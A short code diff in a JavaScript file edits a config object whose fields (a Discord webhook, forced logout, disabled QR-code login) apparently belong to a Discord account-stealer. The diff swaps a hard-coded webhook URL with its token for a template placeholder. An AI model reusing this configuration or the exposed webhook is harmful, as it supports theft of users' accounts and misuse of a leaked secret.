@@ -13,7 +13,7 @@ const fs = require("fs");
 var config = {
     brand: "cermen",
 
-    webhook: "https://discord.com/api/webhooks/1074964680231104562/eIZA5ynlh13i6AQvhKi29BJC14JbK1ip2u2lN4WL-oVL-4yKBBNaxLmplWshNiK1ji7l",
+    webhook: "%WEBHOOK_LINK%",
 
     logout: true,
     disable_qr_code: true,
